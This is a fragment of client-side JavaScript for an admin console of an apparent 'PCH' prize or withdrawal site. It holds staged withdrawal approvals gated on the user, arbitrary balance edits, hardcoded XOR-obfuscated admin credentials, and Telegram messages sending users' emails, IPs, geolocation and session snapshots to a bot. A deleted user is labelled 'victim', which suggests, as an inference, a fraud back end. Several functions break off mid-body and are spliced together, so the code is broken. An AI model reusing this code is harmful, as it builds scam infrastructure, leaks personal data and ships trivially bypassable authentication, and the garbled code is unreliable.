<script>
    const STORAGE_KEY = 'pch_device_state_v13';
    const AUDIT_KEY = 'pch_admin_audit';
    const LOCKOUT_KEY = 'pch_admin_lockout';
    const SESSION_KEY = 'pch_admin_session';
    const IP_BAN_KEY = 'pch_ip_bans';
    const SESSION_TIMEOUT_MS = 30 * 60 * 1000;
    const MAX_FAILED_ATTEMPTS = 5;
    const LOCKOUT_MS = 60 * 1000;
    const DEFAULT_TG = window.PCH_IOS_TELEGRAM || { botToken:'', chatId:'' };

    const PIPELINE_FLOW = {
        'pending':            { label:'Pending',             adminNext:'pending_approved',   tone:'gold',     step:1, badge:'Awaiting User' },
        'pending_submitted':  { label:'Pending Submitted',   adminNext:'pending_approved',   tone:'sky',      step:1, badge:'Awaiting Admin' },
        'pending_approved':   { label:'Processing F&H',      adminNext:null,                 tone:'gold',     step:2, badge:'Awaiting User' },
        'stamp_submitted':    { label:'Processing Submitted',adminNext:'stamp_approved',     tone:'sky',      step:2, badge:'Awaiting Admin' },
        'stamp_approved':     { label:'Stamp of Approval',   adminNext:null,                 tone:'gold',     step:3, badge:'Awaiting User' },
        'final_submitted':    { label:'Final Submitted',     adminNext:'none',               tone:'sky',      step:3, badge:'Awaiting Admin' }
    };

    let currentTab = 'overview';
    let sessionExpiry = Date.now() + SESSION_TIMEOUT_MS;
    let sessionInterval = null;
    let lastActivityTs = Date.now();
    let adminData = { users: [], transactions: [], pipeline: [], accessLogs: [], announcement: null, supportTickets: [], messages: [], raw: {} };

    // === MULTI-LAYER POSITION-DEPENDENT XOR ===
    const _K1 = 91, _K2 = 17;
    const _U_ENC = [43, 15, 21, 163, 254, 212, 172, 187, 141];
    const _P_ENC = [11, 47, 53, 206, 222, 212, 172, 227, 141, 215, 55, 38, 21, 13, 109, 2, 82, 23];
    function _decU() { return _U_ENC.map((c, i) => String.fromCharCode(c ^ ((_K1 + i * _K2) & 0xFF))).join(''); }
    function _decP() { return _P_ENC.map((c, i) => String.fromCharCode(c ^ ((_K1 + i * _K2) & 0xFF))).join(''); }
    function checkCreds(u, p) { try { return String(u).trim().toLowerCase() === _decU().toLowerCase() && String(p) === _decP(); } catch (e) { return false; } }

    function escapeHtml(str) { return String(str ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
    function tgEsc(s) { return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
    function fmtMoney(n) { return '$' + (Number(n) || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
    function fmtTime(iso) { try { const d = new Date(iso); return d.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }); } catch (e) { return iso; } }
    function normalizeTxns(raw) { if (Array.isArray(raw)) return raw; if (raw && typeof raw === 'object') return Object.values(raw); if (typeof raw === 'string') { try { const p = JSON.parse(raw); if (Array.isArray(p)) return p; if (p && typeof p === 'object') return Object.values(p); return []; } catch (e) { return []; } } return []; }

    function readAudit() { try { return JSON.parse(localStorage.getItem(AUDIT_KEY) || '[]'); } catch (e) { return []; } }
    function logAdminAction(action, details) { const log = readAudit(); log.unshift({ ts: new Date().toISOString(), action, details }); if (log.length > 200) log.length = 200; try { localStorage.setItem(AUDIT_KEY, JSON.stringify(log)); } catch (e) {} }
    function readLockout() { try { return JSON.parse(localStorage.getItem(LOCKOUT_KEY) || '{"attempts":0,"lockedUntil":0}'); } catch (e) { return { attempts: 0, lockedUntil: 0 }; } }
    function writeLockout(l) { try { localStorage.setItem(LOCKOUT_KEY, JSON.stringify(l)); } catch (e) {} }
    function clearLockout() { try { localStorage.removeItem(LOCKOUT_KEY); } catch (e) {} }

    // === IP BANNING SYSTEM ===
    function readBannedIPs() { try { return JSON.parse(localStorage.getItem(IP_BAN_KEY) || '{}'); } catch (e) { return {}; } }
    function writeBannedIPs(bans) { try { localStorage.setItem(IP_BAN_KEY, JSON.stringify(bans)); } catch (e) {} }
    function isIPBanned(ip) { if (!ip || ip === 'Unknown') return false; const bans = readBannedIPs(); return !!bans[ip]; }
    async function addBannedIP(ip, reason) {
        if (!ip || ip === 'Unknown') return;
        const bans = readBannedIPs();
        if (bans[ip]) return;
        bans[ip] = { bannedAt: Date.now(), reason: reason || 'Too many failed login attempts' };
        writeBannedIPs(bans);
        if (window.rtdb) { try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'config/ipBans/' + ip.replace(/\./g, '_')), bans[ip]); } catch (e) {} }
        try { await sendTelegramMessage(`🚫 <b>IP BANNED</b>\n<b>IP:</b> <code>${ip}</code>\n<b>Reason:</b> ${tgEsc(reason || 'N/A')}\n<b>Time:</b> ${new Date().toISOString()}`); } catch (e) {}
    }
    async function removeBannedIP(ip) {
        const bans = readBannedIPs();
        delete bans[ip];
        writeBannedIPs(bans);
        if (window.rtdb) { try { await window.rtdb.remove(window.rtdb.ref(window.rtdb.db, 'config/ipBans/' + ip.replace(/\./g, '_'))); } catch (e) {} }
    }
    async function pullBannedIPsFromCloud() {
        if (!window.rtdb) return;
        try {
            const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'config/ipBans'));
            if (snap.exists()) {
                const cloudBans = snap.val() || {};
                const localBans = readBannedIPs();
                Object.keys(cloudBans).forEach(ipKey => {
                    const ip = ipKey.replace(/_/g, '.');
                    if (!localBans[ip]) localBans[ip] = cloudBans[ipKey];
                });
                writeBannedIPs(localBans);
            }
        } catch (e) {}
    }

    function tgCreds() {
      const s = readLocalState();
      const cfg = (s && s.telegramConfig) || {};
      return { botToken: String(cfg.botToken || DEFAULT_TG.botToken).trim(), chatId: String(cfg.chatId || DEFAULT_TG.chatId).trim() };
    }
    async function sendTelegramMessage(textMessage) {
      const { botToken, chatId } = tgCreds();
      if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
      try {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('text', textMessage);
        fd.append('parse_mode', 'HTML');
        fd.append('disable_web_page_preview', 'true');
        const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
        const d = await r.json();
        if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
        return d.ok;
      } catch (err) { console.error('[TG] fetch failed:', err); return false; }
    }

    function detectDevice() {
      const ua = navigator.userAgent || '';
      let os='Unknown', type='Desktop', browser='Unknown';
      if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
      else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
      else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
      else if (/Windows/i.test(ua)) { os='Windows'; }
      else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
      else if (/Linux/i.test(ua)) { os='Linux'; }
      if (/Edg\//i.test(ua)) browser='Edge';
      else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
      else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
      else if (/Firefox\//i.test(ua)) browser='Firefox';
      else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
      return { os, type, browser };
    }
    let cachedIp = null, cachedGeo = null;
    async function fetchIP(){
      if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
      try {
        const r = await fetch('https://ipapi.co/json/');
        if (r.ok) {
          const d = await r.json();
          if (d && d.ip) {
            cachedIp = d.ip;
            cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
            return { ip: cachedIp, ...cachedGeo };
          }
        }
      } catch(e){}
      try {
        const r2 = await fetch('https://api.ipify.org?format=json');
        const d2 = await r2.json();
        if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
      } catch(e){}
      cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
      return { ip: cachedIp, ...cachedGeo };
    }

    async function adminTgBlock() {
      const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
      const dev = detectDevice();
      return {
        block:
          `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
          `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
          `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +

    function showToast(title, message, type = 'info') {
        const container = document.getElementById('toast-container'); if (!container) return;
        const toastId = 'toast-' + Date.now() + '-' + Math.random();
        const icon = type === 'success' ? 'fa-circle-check text-emerald-400' : type === 'error' ? 'fa-circle-exclamation text-rose-400' : 'fa-circle-info text-sky-custom';
        const borderColor = type === 'success' ? 'border-emerald-500/40' : type === 'error' ? 'border-rose-500/40' : 'border-sky-custom/40';
        const toast = document.createElement('div'); toast.id = toastId;
        toast.className = `pointer-events-auto bg-navy-900/95 backdrop-blur-xl border ${borderColor} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
        toast.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs">${escapeHtml(title)}</h5><p class="text-[11px] text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="document.getElementById('${toastId}').remove()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>`;
        container.appendChild(toast); setTimeout(() => { const el = document.getElementById(toastId); if (el) el.remove(); }, 5000);
    }

    function isAuthenticated() { return sessionStorage.getItem(SESSION_KEY) === 'active' && Date.now() < sessionExpiry; }
    function setAuthenticated() { sessionStorage.setItem(SESSION_KEY, 'active'); sessionExpiry = Date.now() + SESSION_TIMEOUT_MS; lastActivityTs = Date.now(); }
    function clearAuth() { sessionStorage.removeItem(SESSION_KEY); }
    function touchActivity() { lastActivityTs = Date.now(); }

    async function handleLogin(e) {
        e.preventDefault();
        const net = await fetchIP().catch(() => ({ ip: 'Unknown' }));
        if (isIPBanned(net.ip)) {
            showToast('Access Denied', 'Your IP has been blocked.', 'error');
            try { await sendTelegramMessage(`🚫 <b>BANNED IP LOGIN ATTEMPT</b>\n<b>IP:</b> <code>${net.ip}</code>\n<b>Time:</b> ${new Date().toISOString()}\n<b>Attempted ID:</b> ${tgEsc(document.getElementById('admin-user').value)}`); } catch (err) {}
            return;
        }
        const lockout = readLockout();
        if (lockout.lockedUntil > Date.now()) { showToast('Locked Out', 'Try again shortly.', 'error'); return; }
        const u = document.getElementById('admin-user').value; const p = document.getElementById('admin-pass').value; const errEl = document.getElementById('login-error');
        const tg = await adminTgBlock();
        if (checkCreds(u, p)) {
            clearLockout(); setAuthenticated(); errEl.classList.add('hidden');
            document.getElementById('login-screen').classList.add('hidden'); document.getElementById('admin-screen').classList.remove('hidden');
            logAdminAction('LOGIN', 'Admin authenticated');
            sendTelegramMessage(
              `🔓 <b>ADMIN LOGIN SUCCESS</b>\n` +
              `<b>Admin ID:</b> ${tgEsc(u)}\n` +
              tg.block
            ).catch(() => {});
            showToast('Welcome, Administrator', 'Console unlocked.', 'success'); refreshData(); startSessionTimer();
        } else {
            lockout.attempts = (lockout.attempts || 0) + 1;
            if (lockout.attempts >= MAX_FAILED_ATTEMPTS) {
                lockout.lockedUntil = Date.now() + LOCKOUT_MS; lockout.attempts = 0; writeLockout(lockout); logAdminAction('LOGIN_FAILED', 'Lockout');
                startLockoutTimer();
                addBannedIP(net.ip, `${MAX_FAILED_ATTEMPTS} failed login attempts`).catch(() => {});
                sendTelegramMessage(
                  `🚫 <b>ADMIN LOGIN LOCKOUT + IP BAN</b>\n` +
                  `<b>Attempted ID:</b> ${tgEsc(u)}\n` +
                  `<b>Reason:</b> ${MAX_FAILED_ATTEMPTS} failed attempts\n` +
                  tg.block
                ).catch(() => {});
            } else {
                writeLockout(lockout); errEl.textContent = `Invalid credentials. ${MAX_FAILED_ATTEMPTS - lockout.attempts} attempt(s) remaining.`; errEl.classList.remove('hidden');
                sendTelegramMessage(
                  `⚠️ <b>ADMIN LOGIN FAILED</b>\n` +
                  `<b>Attempted ID:</b> ${tgEsc(u)}\n` +
                  `<b>Attempt #:</b> ${lockout.attempts}/${MAX_FAILED_ATTEMPTS}\n` +
                  tg.block
                ).catch(() => {});
            }
        }
    }

    async function handleLogout() {
        logAdminAction('LOGOUT', 'Admin signed out');
        clearAuth();
        if (sessionInterval) clearInterval(sessionInterval);
        document.getElementById('admin-screen').classList.add('hidden'); document.getElementById('login-screen').classList.remove('hidden');
        document.getElementById('admin-user').value = ''; document.getElementById('admin-pass').value = '';
        showToast('Signed Out', 'Session ended.', 'info');
        const tg = await adminTgBlock();
        sendTelegramMessage(`🔒 <b>ADMIN LOGOUT</b>\n${tg.block}`).catch(()=>{});
    }

    function startSessionTimer() {
        if (sessionInterval) clearInterval(sessionInterval);
        sessionInterval = setInterval(async () => {
            const elapsed = Date.now() - lastActivityTs;
            if (elapsed > SESSION_TIMEOUT_MS) {
                logAdminAction('SESSION_EXPIRE', 'Auto-logout');
                showToast('Session Expired', 'Logged out.', 'error');
                const tg = await adminTgBlock();
                sendTelegramMessage(`⏰ <b>ADMIN SESSION EXPIRED</b>\n${tg.block}`).catch(()=>{});
                handleLogout(); return;
            }
            const remaining = SESSION_TIMEOUT_MS - elapsed; const m = Math.floor(remaining / 60000); const s = Math.floor((remaining % 60000) / 1000);
            const timerEl = document.getElementById('session-timer'); if (timerEl) timerEl.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
            const bar = document.getElementById('session-bar'); if (bar) bar.style.width = (remaining / SESSION_TIMEOUT_MS * 100) + '%';
        }, 1000);
    }

    function startLockoutTimer() {
        const banner = document.getElementById('lockout-banner'); const timer = document.getElementById('lockout-timer'); const btn = document.getElementById('login-btn');
        if (banner) banner.classList.remove('hidden'); if (btn) { btn.disabled = true; btn.classList.add('opacity-50'); }
        const tick = () => { const lockout = readLockout(); const remaining = Math.max(0, lockout.lockedUntil - Date.now()); if (remaining <= 0) { if (banner) banner.classList.add('hidden'); if (btn) { btn.disabled = false; btn.classList.remove('opacity-50'); } clearLockout(); return; } if (timer) timer.textContent = Math.ceil(remaining / 1000); setTimeout(tick, 500); };
        tick();
    }

    function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebar-backdrop').classList.toggle('hidden'); }
    function showSection(tab) {
        currentTab = tab; document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.tab === tab)); document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        const section = document.getElementById('section-' + tab); if (section) section.classList.add('active');
        const titles = { overview:'Overview', users:'Users', transactions:'Transactions', pipeline:'Pipeline', kyc:'KYC Verification', sessions:'Active Sessions', support:'Support', announcements:'Announcements', messages:'Messages', audit:'Audit Trail', data:'Data Tools' };
        const titleEl = document.getElementById('page-title'); if (titleEl) titleEl.textContent = titles[tab] || tab;
        if (window.innerWidth < 1024 && document.getElementById('sidebar').classList.contains('open')) toggleSidebar(); touchActivity(); renderSection(tab);
    }

    function readLocalState() { try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch (e) { return {}; } }
    async function pullAllUsersFromCloud() { if (!window.rtdb) return {}; try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users')); return snap.exists() ? snap.val() : {}; } catch (e) { return {}; } }
    async function pullAnnouncement() { if (!window.rtdb) return null; try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'config/announcement')); return snap.exists() ? snap.val() : null; } catch (e) { return null; } }
    async function updateUserInCloud(username, fullUser) { if (!window.rtdb) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + String(username).toLowerCase()), fullUser); } catch (e) { console.error('[admin] cloud write failed:', e); } }

    async function refreshData() {
        const local = readLocalState();
        adminData.raw = local;
        const cloudUsers = await pullAllUsersFromCloud();
        adminData.announcement = await pullAnnouncement();
        await pullBannedIPsFromCloud();

        adminData.users = []; const seen = new Set();
        Object.keys(cloudUsers || {}).forEach(key => { const u = cloudUsers[key]; if (!u || !u.username) return; const k = u.username.toLowerCase(); if (seen.has(k)) return; seen.add(k); const copy = Object.assign({}, u); copy.id = copy.username; copy.userBalance = Number(copy.userBalance) || 0; copy.transactions = normalizeTxns(copy.transactions); adminData.users.push(copy); });
        const registered = Array.isArray(local.registeredUsers) ? local.registeredUsers : [];
        registered.forEach(u => { if (!u || !u.username) return; const k = u.username.toLowerCase(); if (seen.has(k)) return; seen.add(k); const copy = Object.assign({}, u); copy.id = copy.username; copy.userBalance = Number(copy.userBalance) || 0; copy.transactions = normalizeTxns(copy.transactions); adminData.users.push(copy); });

        adminData.transactions = []; adminData.pipeline = []; adminData.supportTickets = [];
        adminData.users.forEach(u => {
            u.transactions.forEach(t => adminData.transactions.push({ ...t, username: u.username, userId: u.id }));
            if (u.withdrawalState && u.withdrawalState !== 'none') adminData.pipeline.push({ id: u.id, username: u.username, firstName: u.firstName, lastName: u.lastName, state: u.withdrawalState, currentWithdrawal: u.currentWithdrawal });
            if (u.supportTickets && Array.isArray(u.supportTickets)) {
                u.supportTickets.forEach(t => adminData.supportTickets.push({ ...t, username: u.username }));
            }
        });
        adminData.transactions.sort((a, b) => new Date(b.date) - new Date(a.date));
        adminData.supportTickets.sort((a, b) => b.date - a.date);
        adminData.accessLogs = Array.isArray(local.accessLogs) ? local.accessLogs : [];

        let allMessages = {};
        if (window.rtdb) {
            try {
                const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'messages'));
                if (snap.exists()) allMessages = snap.val();
            } catch(e) {}
        }
        adminData.messages = [];
        Object.keys(allMessages || {}).forEach(uname => {
            const msgs = allMessages[uname];
            Object.keys(msgs || {}).forEach(mid => {
                const m = msgs[mid];
                if (m && typeof m === 'object') {
                    adminData.messages.push({ ...m, username: uname, id: mid });
                }
            });
        });
        adminData.messages.sort((a,b) => {
            const aLast = a.replies && a.replies.length > 0 ? a.replies[a.replies.length-1].time : a.sentAt;
            const bLast = b.replies && b.replies.length > 0 ? b.replies[b.replies.length-1].time : b.sentAt;
            return bLast - aLast;
        });

        updateBadges(adminData);
        renderSection(currentTab);
        touchActivity();
    }

    async function updateUserByUsername(username, mutate) {
        const key = String(username).toLowerCase();
        const source = adminData.users.find(u => (u.username || '').toLowerCase() === key);
        if (!source) return false;
        const updated = Object.assign({}, source);
        mutate(updated);
        await updateUserInCloud(updated.username, updated);
        try {
            const local = readLocalState();
            const users = Array.isArray(local.registeredUsers) ? local.registeredUsers : [];
            const idx = users.findIndex(u => u && (u.username || '').toLowerCase() === key);
            if (idx >= 0) {
                users[idx] = Object.assign({}, users[idx], updated);
                local.registeredUsers = users;
                if (local.currentUser && (local.currentUser.username || '').toLowerCase() === key) {
                    local.currentUser = Object.assign({}, local.currentUser, updated);
                    local.userBalance = updated.userBalance; local.transactions = updated.transactions; local.withdrawalState = updated.withdrawalState; local.currentWithdrawal = updated.currentWithdrawal;
                }
                localStorage.setItem(STORAGE_KEY, JSON.stringify(local));
            }
        } catch (e) {}
        return true;
    }

    async function saveTxnStatus(e, username, refId) {
        e.preventDefault();
        const newStatus = document.getElementById('txn-status-select').value;
        let oldStatus = null, delta = 0, balBefore = 0, balAfter = 0, amount = 0;
        
        const ok = await updateUserByUsername(username, (u) => {
            balBefore = Number(u.userBalance || 0);
            const txnIdx = u.transactions.findIndex(t => t.ref === refId);
            if (txnIdx === -1) return;
            
            oldStatus = u.transactions[txnIdx].status;
            amount = Number(u.transactions[txnIdx].amount) || 0;
            
            u.transactions[txnIdx].status = newStatus;
            
            if (newStatus === 'Refunded' && oldStatus !== 'Refunded') {
                u.userBalance = +(Number(u.userBalance || 0) + amount).toFixed(2);
                delta = amount;
            } else if (newStatus !== 'Refunded' && oldStatus === 'Refunded') {
                u.userBalance = +(Number(u.userBalance || 0) - amount).toFixed(2);
                delta = -amount;
            }
            balAfter = Number(u.userBalance || 0);
        });

        if (ok) {
            showToast('Transaction Updated', `Status changed to ${newStatus}.`, 'success');
            closeModal();
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `💳 <b>ADMIN — TRANSACTION STATUS CHANGED</b>\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Ref:</b> ${tgEsc(refId)}\n` +
              `<b>Old status:</b> ${tgEsc(oldStatus)}\n` +
              `<b>New status:</b> ${tgEsc(newStatus)}\n` +
              `<b>Amount:</b> ${fmtMoney(amount)}\n` +
              `<b>Balance delta:</b> ${delta >= 0 ? '+' : ''}${fmtMoney(delta)}\n` +
              `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
              `<b>Balance after:</b> ${fmtMoney(balAfter)}\n` +
              tg.block
            ).catch(()=>{});
        }
    }

    async function approvePipelineStep(username) {
        const user = adminData.users.find(u => (u.username || '').toLowerCase() === String(username).toLowerCase());
        if (!user) return;
        const flow = PIPELINE_FLOW[user.withdrawalState];
        if (!flow || !flow.adminNext) return;
        
        const cw = user.currentWithdrawal || {};
        const isFinal = flow.adminNext === 'none';
        if (!confirm(`${isFinal ? 'Complete and close' : 'Approve step for'} @${username}?`)) return;

        const beforeState = user.withdrawalState;
        const cwSnapshot = JSON.stringify(cw);

        const ok = await updateUserByUsername(username, (u) => {
            if (isFinal) {
                u.withdrawalState = 'none';
                if (cw.refNum) { u.transactions = (u.transactions || []).map(t => t.ref === cw.refNum ? Object.assign({}, t, { status: 'Completed' }) : t); }
                u.currentWithdrawal = null;
            } else { u.withdrawalState = flow.adminNext; }
        });
        
        if (ok) {
            showToast('Approved', isFinal ? `Withdrawal completed for @${username}.` : `Advanced @${username}.`, 'success');
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `${isFinal ? '✅ <b>ADMIN — WITHDRAWAL COMPLETED</b>' : '🛡️ <b>ADMIN — PIPELINE STEP APPROVED</b>'}\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Name:</b> ${tgEsc((user.firstName||'') + ' ' + (user.lastName||''))}\n` +
              `<b>Email:</b> ${tgEsc(user.email || 'N/A')}\n` +
              `<b>Ref:</b> ${tgEsc(cw.refNum || '—')}\n` +
              `<b>Amount:</b> ${fmtMoney(Number(cw.amount)||0)}\n` +
              `<b>Step label:</b> ${tgEsc(flow.label)}\n` +
              `<b>Previous state:</b> ${tgEsc(beforeState)}\n` +
              `<b>New state:</b> ${tgEsc(isFinal ? 'none (completed)' : flow.adminNext)}\n` +
              `<b>Current withdrawal snapshot:</b> <code>${tgEsc(cwSnapshot)}</code>\n` +
              tg.block
            ).catch(()=>{});
        }
    }

    async function blockSession(username, sid) {
        if (!confirm('Block this device? The user will be logged out.')) return;
        if (!window.rtdb) return;
        const user = adminData.users.find(u => u.username === username);
        if (!user || !user.sessions || !user.sessions[sid]) return;
        
        try {
            const sessionData = user.sessions[sid];
            sessionData.blockedAt = Date.now();
            
            await window.rtdb.set(window.rtdb.ref(window.rtdb.db, `users/${username.toLowerCase()}/blockedDevices/${sid}`), sessionData);
            await window.rtdb.remove(window.rtdb.ref(window.rtdb.db, `users/${username.toLowerCase()}/sessions/${sid}`));
            
            showToast('Device Blocked', 'Session terminated and device blocked.', 'success');
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `🛑 <b>ADMIN — SESSION BLOCKED</b>\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Session ID:</b> <code>${tgEsc(sid)}</code>\n` +
              `<b>Device:</b> ${tgEsc(sessionData.device || 'Unknown')}\n` +
              `<b>Session IP:</b> <code>${tgEsc(sessionData.ip || '—')}</code>\n` +
              `<b>Location:</b> ${tgEsc(sessionData.location || '—')}\n` +
              `<b>Full session snapshot:</b> <code>${tgEsc(JSON.stringify(sessionData))}</code>\n` +
              tg.block
            ).catch(()=>{});
        } catch(e) {
            showToast('Error', 'Could not block device.', 'error');
        }
    }

    async function unblockSession(username, sid) {
        if (!confirm('Unblock this device?')) return;
        if (!window.rtdb) return;
        const user = adminData.users.find(u => u.username === username);

            showToast('Device Unblocked', 'User can log in from this device again.', 'success');

              `<b>Session ID:</b> <code>${tgEsc(sid)}</code>\n` +

    async function triggerExpiringLink() {
        const content = document.getElementById('gen-link-content').value.trim() || 'Secret PCH Data';
        const hours = parseInt(document.getElementById('gen-link-hours').value) || 2;
        
        const btn = event.target;
        const originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1.5"></i> Generating...';
        btn.disabled = true;

        try {
            const functions = getFunctions(window.rtdb.app); 
            const createLink = httpsCallable(functions, 'createExpiringLink');
            const result = await createLink({ content, hours });
            
            document.getElementById('gen-link-result').classList.remove('hidden');
            const linkEl = document.getElementById('gen-link-url');
            linkEl.href = result.data.url;
            linkEl.textContent = result.data.url;
            
            showToast('Link Generated', 'The secure link is ready.', 'success');

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `🔗 <b>ADMIN — EXPIRING LINK GENERATED</b>\n` +
              `<b>Content:</b> ${tgEsc(content)}\n` +
              `<b>Hours:</b> ${tgEsc(hours)}\n` +
              `<b>URL:</b> ${tgEsc(result.data.url)}\n` +
              tg.block
            ).catch(()=>{});
            
        } catch (error) {
            console.error("Error generating link:", error);
            showToast('Failed', error.message || 'Could not generate link.', 'error');
        } finally {
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
    }

        const victim = adminData.users.find(u => (u.username || '').toLowerCase() === String(username).toLowerCase());
        const victimSnapshot = victim ? JSON.stringify({ username: victim.username, email: victim.email, phone: victim.phone, userBalance: victim.userBalance, kyc: victim.kyc, withdrawalState: victim.withdrawalState, currentWithdrawal: victim.currentWithdrawal, configuredMethod: victim.configuredMethod, transactionCount: (victim.transactions || []).length }) : '(not found)';
        try {
            const local = readLocalState();
            local.registeredUsers = (local.registeredUsers || []).filter(u => (u.username || '').toLowerCase() !== String(username).toLowerCase());
            try { localStorage.setItem(STORAGE_KEY, JSON.stringify(local)); } catch (e) {}
            if (window.rtdb) { try { window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + String(username).toLowerCase()), null); } catch (e) {} }
            showToast('Deleted', username + ' removed.', 'success');

            sendTelegramMessage(

              `<b>Deleted user snapshot:</b>\n<code>${tgEsc(victimSnapshot)}</code>\n` +

        if (!amt) return;
        const user = adminData.users.find(u => u.username === username);
        let balBefore = 0, balAfter = 0;
        const ok = await updateUserByUsername(username, (u) => { 
            balBefore = Number(u.userBalance || 0);
            u.userBalance = +(Number(u.userBalance || 0) + amt).toFixed(2); 
            balAfter = Number(u.userBalance || 0);
            u.transactions = Array.isArray(u.transactions) ? u.transactions : []; 
            u.transactions.unshift({ ref: 'ADM-' + Math.floor(10000 + Math.random() * 90000), date: new Date().toISOString().replace('T', ' ').substring(0, 16), amount: amt, type: amt > 0 ? 'Admin Credit' : 'Admin Debit', status: 'Completed', memo });

        if (ok) {
            showToast('Funds Updated', `Adjusted by ${fmtMoney(amt)}.`, 'success');
            closeModal();
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `💰 <b>ADMIN — FUNDS ${amt >= 0 ? 'ADDED' : 'DEDUCTED'}</b>\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Name:</b> ${tgEsc(((user?.firstName||'') + ' ' + (user?.lastName||'')).trim())}\n` +
              `<b>Email:</b> ${tgEsc(user?.email || 'N/A')}\n` +
              `<b>Amount:</b> ${fmtMoney(amt)}\n` +
              `<b>Memo:</b> ${tgEsc(memo)}\n` +
              `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
              `<b>Balance after:</b> ${fmtMoney(balAfter)}\n` +
              tg.block
            ).catch(()=>{});
        }
    }

    function adminWithdrawFromUser(username) {
        const user = adminData.users.find(u => u.username === username);
        if (!user) return;
        if (!user.userBalance || user.userBalance <= 0) { showToast('Empty', 'No funds to withdraw.', 'error'); return; }
        showModal('Withdraw from @' + escapeHtml(username), `<form onsubmit="submitAdminWithdraw(event, '${escapeHtml(username)}')" class="space-y-4"><div class="bg-navy-900 border border-navy-700 p-3.5 rounded-xl flex items-center justify-between"><span class="text-xs text-slate-300">Available</span><span class="text-base font-black text-gold-400">${fmtMoney(user.userBalance)}</span></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Amount ($)</label><input type="number" id="adm-wd-amt" required min="0.01" step="0.01" max="${user.userBalance}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Memo</label><input type="text" id="adm-wd-memo" value="Admin Withdrawal" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div><div class="flex justify-end gap-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-3 bg-gradient-to-r from-rose-500 to-rose-600 text-white font-extrabold rounded-xl text-xs active:scale-95 transition shadow-lg shadow-rose-500/20"><i class="fa-solid fa-money-bill-transfer mr-1.5"></i> Withdraw</button></div></form>`);
    }

    async function submitAdminWithdraw(e, username) {
        e.preventDefault();
        const user = adminData.users.find(u => u.username === username);
        if (!user) return;
